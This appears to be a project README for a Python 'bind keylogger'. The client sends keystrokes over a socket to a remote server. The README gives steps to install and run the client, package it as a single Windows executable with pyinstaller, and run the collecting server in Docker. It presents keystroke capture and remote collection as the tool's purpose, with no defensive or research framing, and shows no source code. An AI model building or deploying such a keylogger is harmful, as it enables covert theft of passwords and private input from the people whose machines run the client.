# Bind Keylogger

A client-server keylogger utilising socket connections within python to manage simultaneous remote connections. 

## Client

Establishes a connection with the server using the specified `IP Address` and `Port` - proceeds to send keystroke data when a key is pressed.

### *Run the Python Client*

1. Install dependencies

    ```console
    pip install -r requirements.txt
    ```

2. Start the client

    ```console
    python client.py
    ```

### *Build a Windows Executeable*

1. Use pyinstaller to build the client.

    ```console
    pyinstaller --onefile client.py
    ```

## Server

Interface used receive keylogger data - listens for and accepts connections from client machines on the specified `IP Address` and `Port`.

### *Containerise with Docker*

1. Build the Docker image

    ```console
    docker build -t keylogger-server .
    ```

2. Creating and running the Docker container

    ```console
    docker run -d -v "$PWD":/usr/src/app -p <hostPort>:<containerPort> --name <name> keylogger-server:latest
    ```

